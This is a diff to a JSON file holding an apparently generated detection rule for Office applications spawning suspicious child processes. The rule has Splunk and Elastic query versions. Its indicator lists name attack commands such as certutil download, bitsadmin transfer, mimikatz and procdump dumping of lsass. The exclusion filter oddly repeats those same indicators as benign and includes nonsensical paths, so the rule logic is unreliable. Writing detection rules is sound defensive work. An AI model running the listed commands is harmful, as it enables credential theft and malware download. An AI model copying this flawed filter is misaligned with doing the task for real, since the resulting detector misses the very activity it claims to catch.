+              "\\Users\\Default\\AppData\\Local\\Temp",
+              "\\Users\\Public\\Documents",
+              "bitsadmin.exe /transfer",
+              "certutil.exe -urlcache",
+              "mimikatz.exe",
+              "mshta.exe vbscript:Execute",
+              "powershell.exe -w hidden",
+              "procdump.exe -ma lsass.exe",
+              "regsvr32 /s /i:"
+            ]
+          },
+          "filter": {
+            "CommandLine|contains": [
+              "\\AppData\\Local\\Temp",
+              "\\Microsoft\\Office",
+              "\\Users\\Default\\AppData\\Local\\Temp",
+              "\\Users\\Public\\Documents",
+              "\\Windows\\System32\\Invoke-Expression",
+              "\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command",
+              "\\Windows\\System32\\bitsadmin.exe /transfer",
+              "\\Windows\\System32\\certutil.exe -urlcache",
+              "\\Windows\\System32\\cmd.exe /c",
+              "\\Windows\\System32\\mimikatz.exe",
+              "\\Windows\\System32\\mshta.exe vbscript:Execute",
+              "\\Windows\\System32\\procdump.exe -ma lsass.exe",
+              "\\Windows\\System32\\regsvr32.exe /s /i:",
+              "\\Windows\\System32\\rundll32.exe"
+            ],
+            "Image|endswith": [
+              "\\EXCEL.EXE",
+              "\\POWERPNT.EXE",
+              "\\WINWORD.EXE",
+              "\\cmd.exe",
+              "\\powershell.exe",
+              "\\rundll32.exe"
+            ],
+            "CommandLine|startswith": [
+              "\"C:\\Program Files (x86)\\Microsoft Office\\",
+              "\"C:\\Program Files\\Microsoft Office\\",
+              "\"C:\\Windows\\System32\\cmd.exe /c",
+              "\"C:\\Windows\\System32\\rundll32.exe"
+            ],
+            "ParentCommandLine|contains": [
+              "\\AppData\\Local\\Temp",
+              "\\Microsoft\\Office",
+              "\\Users\\Default\\AppData\\Local\\Temp",
+              "\\Users\\Public\\Documents",
+              "\\Windows\\System32\\Invoke-Expression",
+              "\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command",
+              "\\Windows\\System32\\bitsadmin.exe /transfer",
+              "\\Windows\\System32\\certutil.exe -urlcache",
+              "\\Windows\\System32\\cmd.exe /c",
+              "\\Windows\\System32\\mimikatz.exe",
+              "\\Windows\\System32\\mshta.exe vbscript:Execute",
+              "\\Windows\\System32\\procdump.exe -ma lsass.exe",
+              "\\Windows\\System32\\regsvr32.exe /s /i:",
+              "\\Windows\\System32\\rundll32.exe"
             ]
           },
           "condition": "selection and not filter"
         },
         "falsepositives": [
-          "Legitimate use of Office applications with macros that trigger cmd.exe or powershell.exe for legitimate tasks.  Review command lines and parent process relationships to determine malicious intent.",
-          "Software installers or updates that may use PowerShell or cmd.exe.  Review the parent process and command line arguments."
+          "Legitimate use of Office applications with scripts or command-line tools (e.g., legitimate IT operations, document automation).",
+          "Software updates or installations that utilize PowerShell or other scripting languages.",
+          "Users opening documents from trusted sources with embedded content that triggers these patterns."
         ],
-        "level": "high",
+        "level": "medium",
         "metadata": {
           "ttp_id": "e484a02c-0880-44eb-9209-bc6658f5259a",
           "technique_id": "T1566.001",
@@ -598,11 +606,11 @@
         "splunk": {
           "status": "success",
           "rule": {
-            "query": "index=windows sourcetype=\"WinEventLog:Security\" EventCode=4688 selection AND NOT (((process_name=\"*\\\\WerFault.exe\" OR process_name=\"*\\\\conhost.exe\" OR process_name=\"*\\\\consent.exe\" OR process_name=\"*\\\\dllhost.exe\") AND (process=\"*\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache*\" OR process=\"*\\\\AppData\\\\Local\\\\Temp\\\\*\" OR process=\"*\\\\ProgramData\\\\Microsoft\\\\Windows\\\\WER\\\\ReportArchive*\")))\n| table _time, host, user, process_name, CommandLine, dest_ip, dest_port",
+            "query": "index=windows sourcetype=\"WinEventLog:Security\" EventCode=4688 (((parent_process_name=\"*\\\\EXCEL.EXE\" OR parent_process_name=\"*\\\\POWERPNT.EXE\" OR parent_process_name=\"*\\\\WINWORD.EXE\") AND (process_name=\"*\\\\cmd.exe\" OR process_name=\"*\\\\powershell.exe\" OR process_name=\"*\\\\rundll32.exe\") AND (process=\"*-enc *\" OR process=\"*IEX (New-Object System.Net.WebClient).DownloadString*\" OR process=\"*Invoke-Expression*\" OR process=\"*Invoke-WebRequest*\" OR process=\"*\\\\AppData\\\\Local\\\\Temp*\" OR process=\"*\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp*\" OR process=\"*\\\\Users\\\\Public\\\\Documents*\" OR process=\"*bitsadmin.exe /transfer*\" OR process=\"*certutil.exe -urlcache*\" OR process=\"*mimikatz.exe*\" OR process=\"*mshta.exe vbscript:Execute*\" OR process=\"*powershell.exe -w hidden*\" OR process=\"*procdump.exe -ma lsass.exe*\" OR process=\"*regsvr32 /s /i:*\"))) AND NOT (((process=\"*\\\\AppData\\\\Local\\\\Temp*\" OR process=\"*\\\\Microsoft\\\\Office*\" OR process=\"*\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp*\" OR process=\"*\\\\Users\\\\Public\\\\Documents*\" OR process=\"*\\\\Windows\\\\System32\\\\Invoke-Expression*\" OR process=\"*\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command*\" OR process=\"*\\\\Windows\\\\System32\\\\bitsadmin.exe /transfer*\" OR process=\"*\\\\Windows\\\\System32\\\\certutil.exe -urlcache*\" OR process=\"*\\\\Windows\\\\System32\\\\cmd.exe /c*\" OR process=\"*\\\\Windows\\\\System32\\\\mimikatz.exe*\" OR process=\"*\\\\Windows\\\\System32\\\\mshta.exe vbscript:Execute*\" OR process=\"*\\\\Windows\\\\System32\\\\procdump.exe -ma lsass.exe*\" OR process=\"*\\\\Windows\\\\System32\\\\regsvr32.exe /s /i:*\" OR process=\"*\\\\Windows\\\\System32\\\\rundll32.exe*\") AND (process_name=\"*\\\\EXCEL.EXE\" OR process_name=\"*\\\\POWERPNT.EXE\" OR process_name=\"*\\\\WINWORD.EXE\" OR process_name=\"*\\\\cmd.exe\" OR process_name=\"*\\\\powershell.exe\" OR process_name=\"*\\\\rundll32.exe\") AND (process=\"\\\"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\*\" OR process=\"\\\"C:\\\\Program Files\\\\Microsoft Office\\\\*\" OR process=\"\\\"C:\\\\Windows\\\\System32\\\\cmd.exe /c*\" OR process=\"\\\"C:\\\\Windows\\\\System32\\\\rundll32.exe*\") AND (parent_process=\"*\\\\AppData\\\\Local\\\\Temp*\" OR parent_process=\"*\\\\Microsoft\\\\Office*\" OR parent_process=\"*\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp*\" OR parent_process=\"*\\\\Users\\\\Public\\\\Documents*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\Invoke-Expression*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\bitsadmin.exe /transfer*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\certutil.exe -urlcache*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\cmd.exe /c*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\mimikatz.exe*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\mshta.exe vbscript:Execute*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\procdump.exe -ma lsass.exe*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\regsvr32.exe /s /i:*\" OR parent_process=\"*\\\\Windows\\\\System32\\\\rundll32.exe*\")))\n| table _time, host, user, process_name, CommandLine, dest_ip, dest_port",
             "alert_config": {
               "name": "Spearphishing Attachment - Office Document with Suspicious Child Process",
-              "description": "Detects spearphishing attempts by identifying suspicious child processes spawned by Microsoft Office applications, indicative of malicious VBA macro execution. Focuses on known indicators like credential dumping tools and PowerShell download cradles.",
-              "severity": "high",
+              "description": "Detects spearphishing attachments by identifying Microsoft Office applications spawning suspicious child processes, indicative of macro execution or malicious activity. Focuses on process relationships and command-line arguments to reduce false positives.",
+              "severity": "medium",
               "cron_schedule": "*/5 * * * *",
               "earliest_time": "-10m@m",
               "latest_time": "now",
@@ -617,17 +625,17 @@
               ],
               "references": [
                 "https://attack.mitre.org/techniques/T1566/001/",
-                "https://www.microsoft.com/en-us/security/blog/2023/11/15/lazarus-group-targets-defense-industry-with-malicious-excel-documents/"
+                "https://www.microsoft.com/en-us/security/blog/2023/12/14/lazarus-group-targets-security-researchers-with-0-day-exploit-and-malware/"
               ]
             },
             "metadata": {
               "rule_name": "Spearphishing Attachment - Office Document with Suspicious Child Process",
               "rule_id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
-              "severity": "high",
-              "description": "Detects spearphishing attempts by identifying suspicious child processes spawned by Microsoft Office applications, indicative of malicious VBA macro execution. Focuses on known indicators like credential dumping tools and PowerShell download cradles.",
+              "severity": "medium",
+              "description": "Detects spearphishing attachments by identifying Microsoft Office applications spawning suspicious child processes, indicative of macro execution or malicious activity. Focuses on process relationships and command-line arguments to reduce false positives.",
               "references": [
                 "https://attack.mitre.org/techniques/T1566/001/",
-                "https://www.microsoft.com/en-us/security/blog/2023/11/15/lazarus-group-targets-defense-industry-with-malicious-excel-documents/"
+                "https://www.microsoft.com/en-us/security/blog/2023/12/14/lazarus-group-targets-security-researchers-with-0-day-exploit-and-malware/"
               ],
               "tags": [
                 "attack.t1566.001",
@@ -642,13 +650,13 @@
         "elasticsearch": {
           "status": "success",
           "rule": {
-            "query": "event.category:\"process\" and event.action:\"start\" and selection and not (((process.executable:*\\\\WerFault.exe or process.executable:*\\\\conhost.exe or process.executable:*\\\\consent.exe or process.executable:*\\\\dllhost.exe) and (process.command_line:*\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache* or process.command_line:*\\\\AppData\\\\Local\\\\Temp\\\\* or process.command_line:*\\\\ProgramData\\\\Microsoft\\\\Windows\\\\WER\\\\ReportArchive*)))",
+            "query": "event.category:\"process\" and event.action:\"start\" and (((process.parent.executable:*\\\\EXCEL.EXE or process.parent.executable:*\\\\POWERPNT.EXE or process.parent.executable:*\\\\WINWORD.EXE) and (process.executable:*\\\\cmd.exe or process.executable:*\\\\powershell.exe or process.executable:*\\\\rundll32.exe) and (process.command_line:*-enc * or process.command_line:*IEX (New-Object System.Net.WebClient).DownloadString* or process.command_line:*Invoke-Expression* or process.command_line:*Invoke-WebRequest* or process.command_line:*\\\\AppData\\\\Local\\\\Temp* or process.command_line:*\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp* or process.command_line:*\\\\Users\\\\Public\\\\Documents* or process.command_line:*bitsadmin.exe /transfer* or process.command_line:*certutil.exe -urlcache* or process.command_line:*mimikatz.exe* or process.command_line:*mshta.exe vbscript:Execute* or process.command_line:*powershell.exe -w hidden* or process.command_line:*procdump.exe -ma lsass.exe* or process.command_line:*regsvr32 /s /i:*))) and not (((process.command_line:*\\\\AppData\\\\Local\\\\Temp* or process.command_line:*\\\\Microsoft\\\\Office* or process.command_line:*\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp* or process.command_line:*\\\\Users\\\\Public\\\\Documents* or process.command_line:*\\\\Windows\\\\System32\\\\Invoke-Expression* or process.command_line:*\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command* or process.command_line:*\\\\Windows\\\\System32\\\\bitsadmin.exe /transfer* or process.command_line:*\\\\Windows\\\\System32\\\\certutil.exe -urlcache* or process.command_line:*\\\\Windows\\\\System32\\\\cmd.exe /c* or process.command_line:*\\\\Windows\\\\System32\\\\mimikatz.exe* or process.command_line:*\\\\Windows\\\\System32\\\\mshta.exe vbscript:Execute* or process.command_line:*\\\\Windows\\\\System32\\\\procdump.exe -ma lsass.exe* or process.command_line:*\\\\Windows\\\\System32\\\\regsvr32.exe /s /i:* or process.command_line:*\\\\Windows\\\\System32\\\\rundll32.exe*) and (process.executable:*\\\\EXCEL.EXE or process.executable:*\\\\POWERPNT.EXE or process.executable:*\\\\WINWORD.EXE or process.executable:*\\\\cmd.exe or process.executable:*\\\\powershell.exe or process.executable:*\\\\rundll32.exe) and (process.command_line:\\\"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\* or process.command_line:\\\"C:\\\\Program Files\\\\Microsoft Office\\\\* or process.command_line:\\\"C:\\\\Windows\\\\System32\\\\cmd.exe /c* or process.command_line:\\\"C:\\\\Windows\\\\System32\\\\rundll32.exe*) and (process.parent.command_line:*\\\\AppData\\\\Local\\\\Temp* or process.parent.command_line:*\\\\Microsoft\\\\Office* or process.parent.command_line:*\\\\Users\\\\Default\\\\AppData\\\\Local\\\\Temp* or process.parent.command_line:*\\\\Users\\\\Public\\\\Documents* or process.parent.command_line:*\\\\Windows\\\\System32\\\\Invoke-Expression* or process.parent.command_line:*\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command* or process.parent.command_line:*\\\\Windows\\\\System32\\\\bitsadmin.exe /transfer* or process.parent.command_line:*\\\\Windows\\\\System32\\\\certutil.exe -urlcache* or process.parent.command_line:*\\\\Windows\\\\System32\\\\cmd.exe /c* or process.parent.command_line:*\\\\Windows\\\\System32\\\\mimikatz.exe* or process.parent.command_line:*\\\\Windows\\\\System32\\\\mshta.exe vbscript:Execute* or process.parent.command_line:*\\\\Windows\\\\System32\\\\procdump.exe -ma lsass.exe* or process.parent.command_line:*\\\\Windows\\\\System32\\\\regsvr32.exe /s /i:* or process.parent.command_line:*\\\\Windows\\\\System32\\\\rundll32.exe*)))",
             "query_type": "KQL",
             "rule_config": {
               "name": "Spearphishing Attachment - Office Document with Suspicious Child Process",
-              "description": "Detects spearphishing attempts by identifying suspicious child processes spawned by Microsoft Office applications, indicative of malicious VBA macro execution. Focuses on known indicators like credential dumping tools and PowerShell download cradles.",
-              "severity": "high",
-              "risk_score": 75,
+              "description": "Detects spearphishing attachments by identifying Microsoft Office applications spawning suspicious child processes, indicative of macro execution or malicious activity. Focuses on process relationships and command-line arguments to reduce false positives.",
+              "severity": "medium",
+              "risk_score": 50,
               "index": [
                 "winlogbeat-*"
               ],
@@ -662,11 +670,12 @@
               ],
               "references": [
                 "https://attack.mitre.org/techniques/T1566/001/",
-                "https://www.microsoft.com/en-us/security/blog/2023/11/15/lazarus-group-targets-defense-industry-with-malicious-excel-documents/"
+                "https://www.microsoft.com/en-us/security/blog/2023/12/14/lazarus-group-targets-security-researchers-with-0-day-exploit-and-malware/"
               ],
               "false_positives": [
-                "Legitimate use of Office applications with macros that trigger cmd.exe or powershell.exe for legitimate tasks.  Review command lines and parent process relationships to determine malicious intent.",
-                "Software installers or updates that may use PowerShell or cmd.exe.  Review the parent process and command line arguments."
+                "Legitimate use of Office applications with scripts or command-line tools (e.g., legitimate IT operations, document automation).",
+                "Software updates or installations that utilize PowerShell or other scripting languages.",
+                "Users opening documents from trusted sources with embedded content that triggers these patterns."
               ],
               "threat": [
                 {
@@ -686,11 +695,11 @@
             "metadata": {
               "rule_name": "Spearphishing Attachment - Office Document with Suspicious Child Process",
               "rule_id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
-              "severity": "high",
-              "description": "Detects spearphishing attempts by identifying suspicious child processes spawned by Microsoft Office applications, indicative of malicious VBA macro execution. Focuses on known indicators like credential dumping tools and PowerShell download cradles.",
+              "severity": "medium",
+              "description": "Detects spearphishing attachments by identifying Microsoft Office applications spawning suspicious child processes, indicative of macro execution or malicious activity. Focuses on process relationships and command-line arguments to reduce false positives.",
               "references": [
                 "https://attack.mitre.org/techniques/T1566/001/",
-                "https://www.microsoft.com/en-us/security/blog/2023/11/15/lazarus-group-targets-defense-industry-with-malicious-excel-documents/"
+                "https://www.microsoft.com/en-us/security/blog/2023/12/14/lazarus-group-targets-security-researchers-with-0-day-exploit-and-malware/"
               ],
               "tags": [
                 "attack.t1566.001",
@@ -711,7 +720,7 @@
         "threat_actor": "lazarus group"
       },
       "metadata": {
-        "generated_at": "2025-10-24T13:06:51.827206",
+        "generated_at": "2025-11-01T22:19:59.122350",
         "processing_time": 0.0,
         "platforms_generated": [
           "splunk",
